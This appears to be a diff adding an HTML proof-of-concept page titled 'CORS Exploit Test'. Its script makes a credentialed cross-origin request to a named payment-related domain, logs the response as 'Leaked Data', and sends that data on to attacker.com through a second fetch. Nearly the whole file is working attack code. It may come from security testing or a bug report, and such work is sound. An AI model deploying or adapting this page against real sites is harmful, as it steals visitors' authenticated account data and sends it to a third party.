@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <h2>CORS Exploit Test</h2>
+    <script>
+      fetch("https://img.allin.movilepay.com", {
+        method: "GET",
+        credentials: "include"
+      })
+      .then(res => res.text())
+      .then(data => {
+        console.log("Leaked Data:", data);
+        // Optional: send to attacker server
+        fetch("https://attacker.com/log?data=" + encodeURIComponent(data));
+      })
+      .catch(console.error);
+    </script>
+  </body>
+</html>
